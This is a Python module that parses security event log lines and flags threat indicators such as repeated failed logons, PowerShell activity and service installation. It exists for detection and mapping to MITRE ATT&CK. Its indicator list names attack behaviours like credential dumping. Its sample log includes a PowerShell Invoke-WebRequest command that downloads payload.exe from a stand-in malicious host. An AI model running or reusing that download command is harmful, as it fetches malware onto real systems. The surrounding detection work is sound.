"""
event_log_parser.py

Parses raw security/system event log text (e.g. Windows Event Log style
entries, or any similarly structured log) and extracts known
threat-relevant keywords that can be fed into framework_mapper for
MITRE/OWASP lookups — mirroring the role nmap_parser.py plays for Nmap
scan output.

Expected log line format (one event per line, flexible spacing):
    <timestamp> [<Category>] EventID=<id> Description: <free text>

Example:
    2026-08-18 10:15:32 [Security] EventID=4625 Description: An account
    failed to log on. Failure Reason: Unknown user name or bad password.
"""

import re

# Known indicator terms watched for inside event log descriptions.
# Includes the same infrastructure-level terms used by nmap_parser
# (for consistency across input sources) plus log-specific behaviours
# that map cleanly onto real MITRE ATT&CK technique names.
KNOWN_INDICATORS = [
    "powershell",
    "remote desktop",
    "rdp",
    "ssh",
    "ftp",
    "smb",
    "telnet",
    "vnc",
    "phishing",
    "brute force",
    "scheduled task",
    "credential dumping",
    "privilege escalation",
    "service installation",
    "clear event log",
    "process injection",
]

_LOG_LINE_RE = re.compile(
    r'^\S+\s+\S+\s+\[(?P<category>[^\]]+)\]\s+EventID=(?P<event_id>\d+)\s+'
    r'Description:\s*(?P<description>.+)$'
)


def parse_event_log(log_text):
    """
    Extract structured entries from raw event log text.

    Only lines matching the expected
    "<timestamp> [<Category>] EventID=<id> Description: <text>" format
    are parsed; unrecognised lines are skipped rather than raising an error,
    since real-world logs often contain blank lines or partial entries.

    Args:
        log_text (str): Raw multi-line event log text.

    Returns:
        list[dict]: Each item is {"category": str, "event_id": str,
            "description": str}.

    Example:
        >>> log = "2026-08-18 10:15:32 [Security] EventID=4625 Description: An account failed to log on."
        >>> parse_event_log(log)
        [{'category': 'Security', 'event_id': '4625', 'description': 'An account failed to log on.'}]
    """
    entries = []
    for line in log_text.splitlines():
        line = line.strip()
        match = _LOG_LINE_RE.match(line)
        if match:
            entries.append({
                "category": match.group("category"),
                "event_id": match.group("event_id"),
                "description": match.group("description").strip(),
            })
    return entries


def extract_keywords(entries):
    """
    Scan a list of parsed log entries and return the known indicator
    keywords (from KNOWN_INDICATORS) found within their descriptions,
    plus any keywords inferred from repeated-event patterns.

    Matching is case-insensitive substring matching against each
    description. In addition, repeated failed-logon events (Windows
    Event ID 4625 appearing 3+ times) are treated as an inferred
    "brute force" indicator, since a single failed logon is normal but
    a cluster of them is a recognised attack pattern.

    Args:
        entries (list[dict]): Parsed log entries, typically the output
            of parse_event_log().

    Returns:
        list[str]: Known indicator keywords found across all entries,
            including any pattern-based inferences.

    Example:
        >>> entries = [{"category": "Security", "event_id": "4104",
        ...     "description": "PowerShell script block logged"}]
        >>> extract_keywords(entries)
        ['powershell']
    """
    found = []
    for entry in entries:
        lower = entry.get("description", "").lower()
        for indicator in KNOWN_INDICATORS:
            if indicator in lower and indicator not in found:
                found.append(indicator)

    # Pattern-based inference: 3+ failed logons (Event ID 4625) suggests
    # a brute-force attempt, even if the log text never says "brute force".
    failed_logon_count = sum(1 for e in entries if e.get("event_id") == "4625")
    if failed_logon_count >= 3 and "brute force" not in found:
        found.append("brute force")

    return found


if __name__ == "__main__":
    sample_log = """
2026-08-18 10:15:32 [Security] EventID=4625 Description: An account failed to log on. Failure Reason: Unknown user name or bad password.
2026-08-18 10:15:34 [Security] EventID=4625 Description: An account failed to log on. Failure Reason: Unknown user name or bad password.
2026-08-18 10:15:36 [Security] EventID=4625 Description: An account failed to log on. Failure Reason: Unknown user name or bad password.
2026-08-18 10:16:01 [Security] EventID=4104 Description: PowerShell script block logged - Invoke-WebRequest -Uri http://malicious.example -OutFile payload.exe
2026-08-18 10:17:45 [System]   EventID=7045 Description: A new service was installed on the system.
"""
    entries = parse_event_log(sample_log)
    print("Entries parsed:", len(entries))
    for e in entries:
        print(" -", e)
    print("Keywords extracted:", extract_keywords(entries))